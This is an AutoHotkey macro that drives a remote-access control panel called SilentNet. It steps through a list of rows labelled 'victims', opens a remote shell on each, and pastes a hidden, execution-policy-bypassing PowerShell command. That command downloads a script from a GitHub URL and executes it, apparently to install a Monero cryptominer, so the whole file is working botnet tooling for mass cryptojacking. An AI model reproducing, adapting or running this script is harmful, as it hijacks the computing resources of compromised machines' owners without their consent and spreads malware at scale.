; ═══════════════════════════════════════════════════════════════
;  XMR Auto-Deploy Macro for SilentNet
;  ─────────────────────────────────────
;  F1 = CALIBRATE (do this ONCE before deploying)
;  F2 = START auto-deploy on ALL victims (AFK mode)
;  F3 = STOP / Exit
;  F4 = Deploy on CURRENT shell only (manual mode)
; ═══════════════════════════════════════════════════════════════

#SingleInstance Force
#NoEnv
SetWorkingDir %A_ScriptDir%
CoordMode, Mouse, Screen
SetKeyDelay, 50, 50
SetMouseDelay, 100

; ── Deploy command ──
deployCmd := "powershell -ep bypass -w hidden -c ""$ProgressPreference='SilentlyContinue';[Net.ServicePointManager]::SecurityProtocol=3072;$h=@{'Authorization'='token '+'YOUR_TOKEN_HERE'+'ZXZc1c2Do'+'w34dIuAjT'+'GtgBLt2kfsTW';'User-Agent'='M'};IEX((Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/holyownsurmom/miner/main/deploy.ps1' -Headers $h -UseBasicParsing).Content)"""

; ── Calibration points ──
actionsX := 928
actionsY := 237
rowHeight := 35
remMgmtX := 895
remMgmtY := 280
remShellX := 893
remShellY := 301
deployWait := 45
calibrated := false
running := false

TrayTip, XMR Deploy Macro, F1=Calibrate | F2=Auto Deploy | F3=Stop | F4=Manual, 5, 1
return

; ═══════════════════════════════════════════════════════════════
;  F1 — CALIBRATION (4 steps with 5 second pauses)
; ═══════════════════════════════════════════════════════════════
F1::
    ; Step 1: First Actions button
    MsgBox, 4096, Step 1/4, Hover over the FIRST row's "Actions" button.`nThen press ENTER.
    KeyWait, Enter, D
    MouseGetPos, actionsX, actionsY
    TrayTip, OK, Actions button saved!, 2, 1
    Sleep, 5000

    ; Step 2: Click it, then point at Remote Management
    MsgBox, 4096, Step 2/4, Now CLICK that Actions button to open the menu.`nHover over "Remote Management".`nThen press ENTER.
    KeyWait, Enter, D
    MouseGetPos, remMgmtX, remMgmtY
    TrayTip, OK, Remote Management saved!, 2, 1
    Sleep, 5000

    ; Step 3: Point at Remote Shell in submenu
    MsgBox, 4096, Step 3/4, Hover over "Remote Shell" in the submenu.`nThen press ENTER.
    KeyWait, Enter, D
    MouseGetPos, remShellX, remShellY
    TrayTip, OK, Remote Shell saved!, 2, 1
    Sleep, 5000

    ; Step 4: Click somewhere empty to close menu, then point at second row
    MsgBox, 4096, Step 4/4, Click somewhere EMPTY on the page to close the menu.`nThen hover over the SECOND row's "Actions" button.`nThen press ENTER.
    KeyWait, Enter, D
    MouseGetPos, tempX, tempY
    rowHeight := tempY - actionsY
    if (rowHeight < 20)
        rowHeight := 35

    calibrated := true
    MsgBox, 4096, Done!, Calibration complete!`nRow height: %rowHeight%px`n`nPress F2 to start auto-deploy!
return

; ═══════════════════════════════════════════════════════════════
;  F2 — AUTO DEPLOY (AFK mode)
; ═══════════════════════════════════════════════════════════════
F2::
    if (running) {
        running := false
        TrayTip, Deploy Macro, STOPPED, 2, 2
        return
    }

    running := true

    InputBox, totalVictims, Auto Deploy, How many victims?, , 250, 130, , , , , 15
    if (ErrorLevel || totalVictims < 1) {
        running := false
        return
    }

    TrayTip, Deploy Macro, Starting on %totalVictims% victims in 5 seconds..., 3, 1
    Sleep, 5000

    deployed := 0
    failed := 0

    Loop, %totalVictims% {
        if (!running)
            break

        currentRow := A_Index
        currentY := actionsY + ((currentRow - 1) * rowHeight)
        menuOffsetY := remMgmtY - actionsY
        shellOffsetY := remShellY - actionsY

        TrayTip, Deploy Macro, [%currentRow%/%totalVictims%] Opening shell..., 1, 1

        ; Step 1: Click Actions button
        Click, %actionsX%, %currentY%
        Sleep, 5000

        ; Step 2: Hover Remote Management
        currentMenuY := currentY + menuOffsetY
        MouseMove, %remMgmtX%, %currentMenuY%
        Sleep, 5000

        ; Step 3: Click Remote Shell
        currentShellY := currentY + shellOffsetY
        Click, %remShellX%, %currentShellY%
        Sleep, 5000

        ; Step 4: Find shell window
        shellFound := false
        WinWait, Shell -, , 10
        if (!ErrorLevel) {
            WinActivate, Shell -
            Sleep, 3000
            shellFound := true
        }

        if (!shellFound) {
            ; Click empty area to dismiss any stuck menu
            Click, 400, 400
            Sleep, 2000
            failed++
            continue
        }

        ; Step 5: Click command input (bottom of shell window)
        WinGetPos, shellWinX, shellWinY, shellWinW, shellWinH, Shell -
        inputAbsX := shellWinX + (shellWinW // 2)
        inputAbsY := shellWinY + shellWinH - 60
        Click, %inputAbsX%, %inputAbsY%
        Sleep, 2000

        ; Step 6: Paste command + Enter
        Clipboard := deployCmd
        Sleep, 500
        Send, ^v
        Sleep, 2000
        Send, {Enter}
        Sleep, 5000

        ; Step 7: Wait for deployment to finish
        TrayTip, Deploy Macro, [%currentRow%/%totalVictims%] Waiting %deployWait%s..., 1, 1
        waitMs := deployWait * 1000
        Sleep, %waitMs%

        ; Step 8: Close shell window
        WinActivate, Shell -
        Sleep, 1000
        WinClose, Shell -
        Sleep, 3000

        ; Step 9: Re-activate SilentNet
        WinActivate, Remote
        Sleep, 1000
        if (ErrorLevel) {
            WinActivate, Silent Net
            Sleep, 1000
        }

        deployed++
        TrayTip, Deploy Macro, [%currentRow%/%totalVictims%] Done! Moving to next..., 1, 1
        Sleep, 3000

        ; Scroll down every 10 rows
        if (Mod(currentRow, 10) = 0) {
            Click, 500, 400
            Sleep, 500
            Loop, 10 {
                Send, {WheelDown}
                Sleep, 200
            }
            Sleep, 3000
        }
    }

    running := false
    MsgBox, 4096, Deploy Complete!, Deployed: %deployed%`nFailed: %failed%`nTotal: %totalVictims%
return

; ═══════════════════════════════════════════════════════════════
;  F4 — MANUAL: Paste + Enter in current shell
; ═══════════════════════════════════════════════════════════════
F4::
    Clipboard := deployCmd
    Sleep, 200
    Send, ^v
    Sleep, 500
    Send, {Enter}
    TrayTip, Deploy Macro, Command sent!, 1, 1
return

; ═══════════════════════════════════════════════════════════════
;  F3 — STOP / EXIT
; ═══════════════════════════════════════════════════════════════
F3::
    running := false
    ExitApp
return
